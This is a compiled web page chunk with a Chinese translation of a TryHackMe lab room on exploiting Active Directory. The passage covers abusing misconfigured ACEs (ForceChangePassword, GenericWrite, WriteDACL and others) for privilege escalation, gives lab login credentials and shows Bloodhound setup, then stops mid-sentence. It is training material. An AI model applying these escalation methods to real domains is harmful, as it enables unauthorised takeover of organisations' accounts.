"use strict";(self.webpackChunktryhackne_cn=self.webpackChunktryhackne_cn||[]).push([[825],{84:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>a,contentTitle:()=>l,default:()=>h,frontMatter:()=>t,metadata:()=>c,toc:()=>d});var r=i(5893),s=i(1151);const t={sidebar_position:5},l="Exploiting Active Directory - Active Directory \u5229\u7528",c={id:"Modules/Compromising-Active-Directory/Exploiting-Active-Directory",title:"Exploiting Active Directory - Active Directory \u5229\u7528",description:"TryHackMe | Exploiting Active Directory",source:"@site/docs/Modules/Compromising-Active-Directory/Exploiting-Active-Directory.md",sourceDirName:"Modules/Compromising-Active-Directory",slug:"/Modules/Compromising-Active-Directory/Exploiting-Active-Directory",permalink:"/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Exploiting-Active-Directory",draft:!1,unlisted:!1,editUrl:"https://github.com/CTF-Archives/Tryhackme-CN/edit/main/docs/Modules/Compromising-Active-Directory/Exploiting-Active-Directory.md",tags:[],version:"current",sidebarPosition:5,frontMatter:{sidebar_position:5},sidebar:"Modules_Sidebar",previous:{title:"Lateral Movement and Pivoting - \u6a2a\u5411\u79fb\u52a8\u548c\u67a2\u7ebd",permalink:"/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Lateral-Movement-and-Pivoting"},next:{title:"Persisting Active Directory - Active Directory \u6301\u4e45\u5316",permalink:"/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Persisting-Active-Directory"}},a={},d=[{value:"Introduction",id:"introduction",level:2},{value:"AD \u5229\u7528",id:"ad-\u5229\u7528",level:3},{value:"\u5b66\u4e60\u76ee\u6807",id:"\u5b66\u4e60\u76ee\u6807",level:3},{value:"\u521d\u59cb\u51ed\u636e",id:"\u521d\u59cb\u51ed\u636e",level:3},{value:"Exploiting Permission Delegation - \u5229\u7528\u6743\u9650\u59d4\u6d3e",id:"exploiting-permission-delegation---\u5229\u7528\u6743\u9650\u59d4\u6d3e",level:2},{value:"\u6743\u9650\u59d4\u6d3e",id:"\u6743\u9650\u59d4\u6d3e",level:3},{value:"\u5229\u7528 ACE\uff08\u8bbf\u95ee\u63a7\u5236\u6761\u76ee\uff09",id:"\u5229\u7528-ace\u8bbf\u95ee\u63a7\u5236\u6761\u76ee",level:3},{value:"Bloodhound",id:"bloodhound",level:3},{value:"\u6743\u9650\u63d0\u5347",id:"\u6743\u9650\u63d0\u5347",level:3},{value:"AddMember - \u6dfb\u52a0\u6210\u5458",id:"addmember---\u6dfb\u52a0\u6210\u5458",level:3},{value:"\u5f3a\u5236\u66f4\u6539\u5bc6\u7801",id:"\u5f3a\u5236\u66f4\u6539\u5bc6\u7801",level:3},{value:"Exploiting Kerberos Delegation - \u5229\u7528 Kerberos \u59d4\u6d3e",id:"exploiting-kerberos-delegation---\u5229\u7528-kerberos-\u59d4\u6d3e",level:2},{value:"Kerberos \u59d4\u6d3e",id:"kerberos-\u59d4\u6d3e",level:3},{value:"\u53d7\u7ea6\u675f\u4e0e\u65e0\u7ea6\u675f",id:"\u53d7\u7ea6\u675f\u4e0e\u65e0\u7ea6\u675f",level:3},{value:"\u57fa\u4e8e\u8d44\u6e90\u7684\u59d4\u6d3e",id:"\u57fa\u4e8e\u8d44\u6e90\u7684\u59d4\u6d3e",level:3},{value:"\u9488\u5bf9\u53d7\u9650\u59d4\u6258\u7684\u5229\u7528",id:"\u9488\u5bf9\u53d7\u9650\u59d4\u6258\u7684\u5229\u7528",level:3},{value:"Exploiting Automated Relays - \u5229\u7528\u81ea\u52a8\u4e2d\u7ee7",id:"exploiting-automated-relays---\u5229\u7528\u81ea\u52a8\u4e2d\u7ee7",level:2},{value:"Machine \u8d26\u6237",id:"machine-\u8d26\u6237",level:3},{value:"The Printer Bug - \u6253\u5370\u673a\u9519\u8bef",id:"the-printer-bug---\u6253\u5370\u673a\u9519\u8bef",level:3},{value:"Print Spooler Service - \u6253\u5370\u540e\u53f0\u5904\u7406\u670d\u52a1",id:"print-spooler-service---\u6253\u5370\u540e\u53f0\u5904\u7406\u670d\u52a1",level:3},{value:"SMB Signing - SMB \u7b7e\u540d",id:"smb-signing---smb-\u7b7e\u540d",level:3},{value:"Exploiting Authentication Relays - \u5229\u7528\u8eab\u4efd\u9a8c\u8bc1\u4e2d\u7ee7",id:"exploiting-authentication-relays---\u5229\u7528\u8eab\u4efd\u9a8c\u8bc1\u4e2d\u7ee7",level:3},{value:"Exploiting AD Users - \u5229\u7528 AD \u7528\u6237",id:"exploiting-ad-users---\u5229\u7528-ad-\u7528\u6237",level:2},{value:"\u7528\u6237\u548c\u7528\u6237\u884c\u4e3a",id:"\u7528\u6237\u548c\u7528\u6237\u884c\u4e3a",level:3},{value:"\u5bfb\u627e\u51ed\u8bc1",id:"\u5bfb\u627e\u51ed\u8bc1",level:3},{value:"SYSTEM \u6709\u65f6\u7279\u6743\u592a\u9ad8",id:"system-\u6709\u65f6\u7279\u6743\u592a\u9ad8",level:3},{value:"Exploiting GPOs - \u5229\u7528 GPOs",id:"exploiting-gpos---\u5229\u7528-gpos",level:2},{value:"\u7ec4\u7b56\u7565\u5bf9\u8c61",id:"\u7ec4\u7b56\u7565\u5bf9\u8c61",level:3},{value:"\u7ec4\u7b56\u7565\u7ba1\u7406",id:"\u7ec4\u7b56\u7565\u7ba1\u7406",level:3},{value:"\u5229\u7528 GPOs",id:"\u5229\u7528-gpos",level:3},{value:"Exploiting Certificates - \u5229\u7528\u8bc1\u4e66",id:"exploiting-certificates---\u5229\u7528\u8bc1\u4e66",level:2},{value:"AD \u8bc1\u4e66\u670d\u52a1",id:"ad-\u8bc1\u4e66\u670d\u52a1",level:3},{value:"\u67e5\u627e\u6613\u53d7\u653b\u51fb\u7684\u8bc1\u4e66\u6a21\u677f",id:"\u67e5\u627e\u6613\u53d7\u653b\u51fb\u7684\u8bc1\u4e66\u6a21\u677f",level:3},{value:"\u5229\u7528\u8bc1\u4e66\u6a21\u677f",id:"\u5229\u7528\u8bc1\u4e66\u6a21\u677f",level:3},{value:"\u901a\u8fc7\u8bc1\u4e66\u6a21\u62df\u7528\u6237",id:"\u901a\u8fc7\u8bc1\u4e66\u6a21\u62df\u7528\u6237",level:3},{value:"Exploiting Domain Trusts - \u5229\u7528\u57df\u4fe1\u4efb",id:"exploiting-domain-trusts---\u5229\u7528\u57df\u4fe1\u4efb",level:2},{value:"\u57df\u4fe1\u4efb",id:"\u57df\u4fe1\u4efb",level:3},{value:"KRBTGT \u548c\u9ec4\u91d1\u7968\u636e",id:"krbtgt-\u548c\u9ec4\u91d1\u7968\u636e",level:3},{value:"Inter-Realm TGTs - \u8de8\u57df TGT",id:"inter-realm-tgts---\u8de8\u57df-tgt",level:3},{value:"\u5229\u7528\u57df\u4fe1\u4efb",id:"\u5229\u7528\u57df\u4fe1\u4efb",level:3},{value:"Conclusion",id:"conclusion",level:2},{value:"\u7f13\u89e3\u63aa\u65bd",id:"\u7f13\u89e3\u63aa\u65bd",level:3}];function o(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,s.a)(),...e.components},{Details:t}=n;return t||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"exploiting-active-directory---active-directory-\u5229\u7528",children:"Exploiting Active Directory - Active Directory \u5229\u7528"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://tryhackme.com/room/exploitingad",children:"TryHackMe | Exploiting Active Directory"})}),"\n",(0,r.jsx)(n.p,{children:"Updated in 2023-12-12"}),"\n",(0,r.jsx)(n.p,{children:"\u5b66\u4e60\u5e38\u89c1\u7684 AD \u5229\u7528\u6280\u672f\uff0c\u8ba9\u4f60\u5728 AD \u73af\u5883\u4e2d\u8fbe\u6210\u76ee\u6807\u3002"}),"\n",(0,r.jsx)(n.p,{children:"Learn common AD exploitation techniques that can allow you to reach your goal in an AD environment."}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"introduction",children:"Introduction"}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a\u7f51\u7edc\u662f ",(0,r.jsx)(n.code,{children:"Breaching AD"})," \u548c ",(0,r.jsx)(n.code,{children:"Enumerating AD"})," \u7684\u5ef6\u7eed\u3002\u8bf7\u786e\u4fdd\u5728\u7ee7\u7eed\u8fdb\u884c\u8fd9\u4e2a\u7f51\u7edc\u4e4b\u524d\u5b8c\u6210\u8fd9\u4e9b\u7f51\u7edc\u3002\u53e6\u5916\uff0c\u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u5c06\u4f1a\u5bf9 AD \u5bf9\u8c61\u8fdb\u884c\u8be6\u7ec6\u8ba8\u8bba\u3002\u5982\u679c\u4f60\u9700\u8981\u590d\u4e60\uff0c\u8bf7\u5feb\u901f\u6d4f\u89c8\u4e00\u4e0b\u8fd9\u4e2a\u623f\u95f4\u3002\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u7a81\u7834\u4e86 AD \u5e76\u679a\u4e3e\u4e86\u57df\u7684\u7ed3\u6784\uff0c\u6211\u4eec\u5c06\u63a2\u7d22\u4e0d\u540c\u7684\u65b9\u6cd5\uff0c\u5229\u7528\u53ef\u80fd\u5728\u6211\u4eec\u679a\u4e3e\u4e2d\u6d6e\u51fa\u6c34\u9762\u7684\u914d\u7f6e\u9519\u8bef\u3002"]}),"\n",(0,r.jsx)(n.h3,{id:"ad-\u5229\u7528",children:"AD \u5229\u7528"}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u6267\u884c\u4e86\u5185\u90e8\u4fa6\u5bdf\uff0c\u5e76\u4e86\u89e3\u4e86\u5173\u4e8e AD \u7ed3\u6784\u548c\u73af\u5883\u7684\u60c5\u51b5\uff0c\u662f\u65f6\u5019\u8fdb\u5165\u5229\u7528\u9636\u6bb5\u4e86\u3002\u8fd9\u4e2a\u9636\u6bb5\u5229\u7528\u914d\u7f6e\u9519\u8bef\u6267\u884c\u6a2a\u5411\u79fb\u52a8\u548c\u6743\u9650\u63d0\u5347\u7684\u7ec4\u5408\uff0c\u76f4\u5230\u6211\u4eec\u8fbe\u5230\u4e00\u4e2a\u9002\u5f53\u7684\u4f4d\u7f6e\u6765\u6267\u884c\u6211\u4eec\u7684\u76ee\u6807\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002\u8fd9\u4e2a\u9636\u6bb5\u901a\u5e38\u4e0e\u6301\u4e45\u5316\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u4ee5\u786e\u4fdd\u6211\u4eec\u4e0d\u4f1a\u5931\u53bb\u65b0\u83b7\u5f97\u7684\u4f4d\u7f6e\uff0c\u4f46\u8fd9\u5c06\u5728\u4e0b\u4e00\u4e2a\u623f\u95f4\u4e2d\u8ba8\u8bba\u3002\u901a\u5e38\u8fd8\u4f1a\u4e0e\u989d\u5916\u7684\u679a\u4e3e\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u56e0\u4e3a\u6211\u4eec\u7684\u65b0\u4f4d\u7f6e\u53ef\u80fd\u5141\u8bb8\u6211\u4eec\u83b7\u53d6\u6709\u5173\u73af\u5883\u60c5\u51b5\u7684\u5176\u4ed6\u4fe1\u606f\u3002"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"AD \u5229\u7528\u6d41\u7a0b",src:i(4170).Z+"",width:"920",height:"410"})})}),"\n",(0,r.jsx)(n.h3,{id:"\u5b66\u4e60\u76ee\u6807",children:"\u5b66\u4e60\u76ee\u6807"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u8fd9\u4e2a\u7f51\u7edc\u4e2d\uff0c\u6211\u4eec\u5c06\u6db5\u76d6\u51e0\u79cd\u53ef\u4ee5\u7528\u6765\u5229\u7528 AD \u914d\u7f6e\u9519\u8bef\u7684\u65b9\u6cd5\u3002\u8fd9\u7edd\u4e0d\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u5217\u8868\uff0c\u56e0\u4e3a\u53ef\u7528\u7684\u65b9\u6cd5\u901a\u5e38\u9ad8\u5ea6\u60c5\u5883\u5316\uff0c\u53d6\u51b3\u4e8e AD \u7ed3\u6784\u548c\u73af\u5883\u3002\u4f46\u662f\uff0c\u6211\u4eec\u5c06\u6db5\u76d6\u4ee5\u4e0b\u7528\u4e8e\u5229\u7528 AD \u7684\u6280\u672f\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"AD \u59d4\u6d3e"}),"\n",(0,r.jsx)(n.li,{children:"\u5f3a\u5236\u8eab\u4efd\u9a8c\u8bc1\u4e2d\u7ee7"}),"\n",(0,r.jsx)(n.li,{children:"\u7ec4\u7b56\u7565\u5bf9\u8c61"}),"\n",(0,r.jsx)(n.li,{children:"\u9488\u5bf9 AD \u7528\u6237"}),"\n",(0,r.jsx)(n.li,{children:"\u57df\u4fe1\u4efb"}),"\n",(0,r.jsx)(n.li,{children:"\u767d\u94f6\u7968\u636e\u548c\u9ec4\u91d1\u7968\u636e"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"\u521d\u59cb\u51ed\u636e",children:"\u521d\u59cb\u51ed\u636e"}),"\n",(0,r.jsxs)(n.p,{children:["\u8bbf\u95ee ",(0,r.jsx)(n.code,{children:"http://distributor.za.tryhackme.loc/creds"})," \u5f97\u5230\u521d\u59cb\u51ed\u636e"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Your credentials have been generated: Username: christopher.smith Password: Mznl7973\n"})}),"\n",(0,r.jsx)(n.h2,{id:"exploiting-permission-delegation---\u5229\u7528\u6743\u9650\u59d4\u6d3e",children:"Exploiting Permission Delegation - \u5229\u7528\u6743\u9650\u59d4\u6d3e"}),"\n",(0,r.jsx)(n.p,{children:"Active Directory \u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2a\u540d\u4e3a Permission Delegation\uff08\u4e0d\u8981\u4e0e\u63a5\u4e0b\u6765\u8981\u8ba8\u8bba\u7684 Kerberos \u59d4\u6d3e\u6df7\u6dc6\uff09\u7684\u529f\u80fd\u6765\u59d4\u6d3e\u6743\u9650\u548c\u7279\u6743\u3002\u59d4\u6d3e\u662f\u4f7f AD \u5728\u7ec4\u7ec7\u4e2d\u5982\u6b64\u5f3a\u5927\u7684\u539f\u56e0\u3002\u60f3\u8c61\u4e00\u4e0b\uff0c\u6211\u4eec\u4e3a\u4e00\u4e2a\u6709 50000 \u540d\u5458\u5de5\u7684\u7ec4\u7ec7\u5de5\u4f5c\u3002\u7531\u4e8e\u6211\u4eec\u5173\u5fc3\u5b89\u5168\uff0c\u6211\u4eec\u53ea\u6709\u4e09\u4e2a\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee DA \u51ed\u636e\u3002\u5bf9\u4e8e\u8fd9\u4e09\u4e2a\u7528\u6237\u6765\u8bf4\uff0c\u5904\u7406\u6240\u6709\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u6bd4\u5982\u91cd\u7f6e\u4ed6\u4eec\u7684\u5bc6\u7801\uff0c\u5c06\u662f\u4e0d\u53ef\u80fd\u7684\u3002\u4f7f\u7528\u59d4\u6d3e\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5f3a\u5236\u66f4\u6539\u7528\u6237\u5bc6\u7801\u7684\u6743\u9650\u59d4\u6d3e\u7ed9\u5e2e\u52a9\u53f0\u56e2\u961f\uff0c\u8fd9\u610f\u5473\u7740\u4ed6\u4eec\u73b0\u5728\u5bf9\u8fd9\u4e2a\u7279\u5b9a\u529f\u80fd\u62e5\u6709\u4e86\u59d4\u6d3e\u7279\u6743\u3002\u539f\u5219\u4e0a\uff0c\u4e3a\u4e86\u4fdd\u6301\u59d4\u6d3e\u7684\u5b89\u5168\u6027\uff0c\u5e94\u8be5\u9075\u5faa\u6700\u5c0f\u7279\u6743\u539f\u5219\u3002\u7136\u800c\uff0c\u5728\u5927\u578b\u7ec4\u7ec7\u4e2d\uff0c\u8981\u505a\u5230\u8fd9\u4e00\u70b9\u5e76\u4e0d\u5bb9\u6613\u3002\u5728\u8fd9\u4e2a\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5c06\u770b\u770b\u5982\u4f55\u5229\u7528\u4e00\u4e9b\u59d4\u6d3e\u914d\u7f6e\u9519\u8bef\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u6743\u9650\u59d4\u6d3e",children:"\u6743\u9650\u59d4\u6d3e"}),"\n",(0,r.jsx)(n.p,{children:"\u6743\u9650\u59d4\u6d3e\u7684\u5229\u7528\u901a\u5e38\u88ab\u79f0\u4e3a\u57fa\u4e8e ACL \u7684\u653b\u51fb\u3002AD \u5141\u8bb8\u7ba1\u7406\u5458\u914d\u7f6e\u8bbf\u95ee\u63a7\u5236\u6761\u76ee\uff08ACE\uff09\uff0c\u8fd9\u4e9b\u6761\u76ee\u586b\u5145\u4e86\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff08DACL\uff09\uff0c\u56e0\u6b64\u5f97\u540d\u57fa\u4e8e ACL \u7684\u653b\u51fb\u3002\u51e0\u4e4e\u4efb\u4f55 AD \u5bf9\u8c61\u90fd\u53ef\u4ee5\u901a\u8fc7 ACE \u8fdb\u884c\u5b89\u5168\u914d\u7f6e\uff0c\u7136\u540e\u63cf\u8ff0\u5176\u4ed6\u4efb\u4f55 AD \u5bf9\u8c61\u5bf9\u76ee\u6807\u5bf9\u8c61\u5177\u6709\u7684\u5141\u8bb8\u548c\u62d2\u7edd\u6743\u9650\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u7136\u800c\uff0c\u5982\u679c\u8fd9\u4e9b ACE \u88ab\u914d\u7f6e\u9519\u8bef\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u5b83\u4eec\u3002\u8ba9\u6211\u4eec\u518d\u6b21\u770b\u770b\u6211\u4eec\u7684\u4f8b\u5b50\u3002\u5982\u679c IT \u652f\u6301\u56e2\u961f\u88ab\u6388\u4e88\u4e86\u5bf9 Domain Users \u7ec4\u7684 ForceChangePassword ACE\uff0c\u8fd9\u5c06\u88ab\u89c6\u4e3a\u4e0d\u5b89\u5168\u3002\u5f53\u7136\uff0c\u4ed6\u4eec\u53ef\u4ee5\u91cd\u7f6e\u5fd8\u8bb0\u5bc6\u7801\u7684\u5458\u5de5\u7684\u5bc6\u7801\uff0c\u4f46\u8fd9\u79cd\u914d\u7f6e\u9519\u8bef\u4e5f\u4f1a\u5141\u8bb8\u4ed6\u4eec\u91cd\u7f6e\u7279\u6743\u5e10\u6237\u7684\u5bc6\u7801\uff0c\u4f8b\u5982\u5c5e\u4e8e Domain Admins \u7ec4\u7684\u5e10\u6237\uff0c\u5b9e\u8d28\u4e0a\u5141\u8bb8\u7279\u6743\u63d0\u5347\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u5229\u7528-ace\u8bbf\u95ee\u63a7\u5236\u6761\u76ee",children:"\u5229\u7528 ACE\uff08\u8bbf\u95ee\u63a7\u5236\u6761\u76ee\uff09"}),"\n",(0,r.jsxs)(n.p,{children:["\u6ee5\u7528 ACE\uff08\u8bbf\u95ee\u63a7\u5236\u6761\u76ee\uff09\u7684\u6570\u91cf\u53ef\u89c2\uff0c\u6bcf\u4e2a\u6f0f\u6d1e\u5229\u7528\u7684\u65b9\u5f0f\u90fd\u6709\u6240\u4e0d\u540c\u3002",(0,r.jsx)(n.a,{href:"https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#",children:"Bloodhound \u6587\u6863"})," \u6709\u52a9\u4e8e\u89e3\u91ca\u5217\u4e3e\u7684 ACE \u4ee5\u53ca\u5b83\u4eec\u5982\u4f55\u88ab\u5229\u7528\u3002\u7136\u800c\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u5c06\u770b\u4e00\u4e0b\u51e0\u4e2a\u663e\u8457\u7684\uff1a"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"ForceChangePassword\uff1a\u6211\u4eec\u6709\u80fd\u529b\u5728\u4e0d\u77e5\u9053\u7528\u6237\u5f53\u524d\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u8bbe\u7f6e\u5176\u5f53\u524d\u5bc6\u7801\u3002"}),"\n",(0,r.jsx)(n.li,{children:"AddMembers\uff1a\u6211\u4eec\u6709\u80fd\u529b\u5c06\u7528\u6237\uff08\u5305\u62ec\u6211\u4eec\u81ea\u5df1\u7684\u5e10\u6237\uff09\u3001\u7ec4\u6216\u8ba1\u7b97\u673a\u6dfb\u52a0\u5230\u76ee\u6807\u7ec4\u3002"}),"\n",(0,r.jsx)(n.li,{children:"GenericAll\uff1a\u6211\u4eec\u5bf9\u5bf9\u8c61\u62e5\u6709\u5b8c\u5168\u63a7\u5236\u6743\uff0c\u5305\u62ec\u66f4\u6539\u7528\u6237\u5bc6\u7801\u3001\u6ce8\u518c SPN \u6216\u5c06 AD \u5bf9\u8c61\u6dfb\u52a0\u5230\u76ee\u6807\u7ec4\u7684\u80fd\u529b\u3002"}),"\n",(0,r.jsx)(n.li,{children:"GenericWrite\uff1a\u6211\u4eec\u53ef\u4ee5\u66f4\u65b0\u76ee\u6807\u5bf9\u8c61\u7684\u4efb\u4f55\u975e\u53d7\u4fdd\u62a4\u53c2\u6570\u3002\u4f8b\u5982\uff0c\u8fd9\u53ef\u80fd\u4f7f\u6211\u4eec\u80fd\u591f\u66f4\u65b0 scriptPath \u53c2\u6570\uff0c\u8fd9\u5c06\u5bfc\u81f4\u7528\u6237\u4e0b\u6b21\u767b\u5f55\u65f6\u6267\u884c\u811a\u672c\u3002"}),"\n",(0,r.jsx)(n.li,{children:"WriteOwner\uff1a\u6211\u4eec\u53ef\u4ee5\u66f4\u65b0\u76ee\u6807\u5bf9\u8c61\u7684\u6240\u6709\u8005\u3002\u6211\u4eec\u53ef\u4ee5\u5c06\u81ea\u5df1\u8bbe\u4e3a\u6240\u6709\u8005\uff0c\u4ece\u800c\u83b7\u5f97\u5bf9\u5bf9\u8c61\u7684\u989d\u5916\u6743\u9650\u3002"}),"\n",(0,r.jsx)(n.li,{children:"WriteDACL\uff1a\u6211\u4eec\u53ef\u4ee5\u5411\u76ee\u6807\u5bf9\u8c61\u7684 DACL \u4e2d\u5199\u5165\u65b0\u7684 ACE\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5199\u5165\u4e00\u4e2a ACE\uff0c\u6388\u4e88\u6211\u4eec\u7684\u5e10\u6237\u5bf9\u76ee\u6807\u5bf9\u8c61\u7684\u5b8c\u5168\u63a7\u5236\u3002"}),"\n",(0,r.jsx)(n.li,{children:"AllExtendedRights\uff1a\u6211\u4eec\u53ef\u4ee5\u6267\u884c\u4e0e\u76ee\u6807\u5bf9\u8c61\u76f8\u5173\u7684\u6269\u5c55 AD \u6743\u9650\u7684\u4efb\u4f55\u64cd\u4f5c\u3002\u8fd9\u5305\u62ec\u4f8b\u5982\u5f3a\u5236\u66f4\u6539\u7528\u6237\u5bc6\u7801\u7684\u80fd\u529b\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4e3a\u4e86\u5229\u7528\u8fd9\u4e9b ACE\uff0c\u6211\u4eec\u9700\u8981\u4e00\u79cd\u4e0e AD \u4ea4\u4e92\u7684\u65b9\u6cd5\u6765\u53d1\u51fa\u8fd9\u4e9b\u8bf7\u6c42\u3002\u4e24\u79cd\u6700\u4f73\u9009\u62e9\u662f AD-RSAT PowerShell cmdlet \u6216 PowerSploit\u3002\u6839\u636e\u5165\u4fb5\u60c5\u51b5\u548c\u73af\u5883\u4e2d\u7684\u68c0\u6d4b\u5de5\u5177\uff0c\u5176\u4e2d\u4e00\u79cd\u9009\u9879\u53ef\u80fd\u66f4\u9690\u79d8\u3002\u5728\u8fd9\u4e2a\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5c06\u5c55\u793a\u4e24\u79cd\u65b9\u6cd5\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"bloodhound",children:"Bloodhound"}),"\n",(0,r.jsx)(n.p,{children:"Sharphound \u5df2\u7ecf\u4e3a\u60a8\u6267\u884c\u8fc7\uff0c\u5e76\u4f5c\u4e3a\u4e00\u4e2a\u4efb\u52a1\u6587\u4ef6\u9644\u52a0\u4e86\u8fdb\u6765\u3002\u5728 AttackBox \u6216\u60a8\u7684 Kali \u673a\u5668\u4e0a\u542f\u52a8 Bloodhound \u5e76\u5bfc\u5165\u6570\u636e\u3002\u4f46\u662f\uff0c\u60a8\u4e5f\u53ef\u4ee5\u6309\u7167 \u201c\u679a\u4e3e AD\u201d \u623f\u95f4\u63d0\u4f9b\u7684\u6b65\u9aa4\u91cd\u65b0\u8fd0\u884c Sharphound\u3002"}),"\n",(0,r.jsx)(n.admonition,{type:"tip",children:(0,r.jsxs)(n.p,{children:["\u5982\u679c\u51fa\u73b0 ",(0,r.jsx)(n.code,{children:"Unable to connect to LDAP, verify your credentials"})," \uff0c\u8bf7\u9a8c\u8bc1\u60a8\u7684\u51ed\u636e\u5e76\u786e\u4fdd\u57df\u8bbe\u7f6e\u6b63\u786e"]})}),"\n",(0,r.jsxs)(n.p,{children:["\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e2a SharpHound \u6570\u636e\u7684 ZIP \u6587\u4ef6\u4f5c\u4e3a\u4e00\u4e2a\u4efb\u52a1\u6587\u4ef6\u3002\u5728 AttackBox \u4e0a\uff0c\u60a8\u53ef\u4ee5\u5728 ",(0,r.jsx)(n.code,{children:"/root/Rooms/ExploitingAD/"})," \u4e0b\u627e\u5230 ZIP \u6587\u4ef6\u3002\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u542f\u52a8 neo4j\uff1a"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:"thm@thm:~# neo4j console start\nActive database: graph.db\nDirectories in use:\n  home:         /var/lib/neo4j\n  config:       /etc/neo4j\n  logs:         /var/log/neo4j\n  plugins:      /var/lib/neo4j/plugins\n  import:       /var/lib/neo4j/import\n  data:         /var/lib/neo4j/data\n  certificates: /var/lib/neo4j/certificates\n  run:          /var/run/neo4j\nStarting Neo4j.\n[....]\n2022-03-13 19:59:18.014+0000 INFO  Bolt enabled on 127.0.0.1:7687.\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u9009\u9879\u5361\u4e2d\u8fd0\u884c\u547d\u4ee4 ",(0,r.jsx)(n.code,{children:"bloodhound --no-sandbox"}),"\u3002\u8fd9\u5c06\u663e\u793a\u8ba4\u8bc1\u7684 GUI \u754c\u9762\uff1a"]}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"bloodhound GUI Starting",src:i(7044).Z+"",width:"492",height:"377"})})}),"\n",(0,r.jsx)(n.h3,{id:"\u6743\u9650\u63d0\u5347",children:"\u6743\u9650\u63d0\u5347"}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c\u5728 Bloodhound \u4e2d\u641c\u7d22\u6211\u4eec\u5728\u4efb\u52a1 1 \u4e2d\u5206\u914d\u7684\u7528\u6237\u8d26\u6237\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u6211\u4eec\u5e76\u6ca1\u6709\u5f88\u591a\u6743\u9650\u3002\u6211\u4eec\u6709\u80fd\u529b\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u5230 THMWRK1\uff0c\u4f46\u8fd9\u53ea\u4f1a\u7ed9\u6211\u4eec\u63d0\u4f9b\u4f4e\u6743\u9650\u7684\u8bbf\u95ee\u3002"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Bloodhound \u9488\u5bf9\u7528\u6237\u8fdb\u884c\u68c0\u7d22",src:i(9634).Z+"",width:"619",height:"193"})})}),"\n",(0,r.jsx)(n.p,{children:"\u7531\u4e8e\u57df\u662f\u5206\u5c42\u7684\uff0c\u6211\u4eec\u7684\u7b2c\u4e00\u6b65\u5c06\u662f\u653b\u51fb\u7b2c\u4e8c\u5c42\u57fa\u7840\u8bbe\u65bd\u3002\u6211\u4eec\u9700\u8981\u653b\u51fb\u7b2c\u4e8c\u5c42\u7ba1\u7406\u5458\u7ec4\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u7ec4\u5bf9\u6240\u6709\u5de5\u4f5c\u7ad9\u5177\u6709\u7ba1\u7406\u5458\u7279\u6743\u3002\u8ba9\u6211\u4eec\u8be2\u95ee Bloodhound 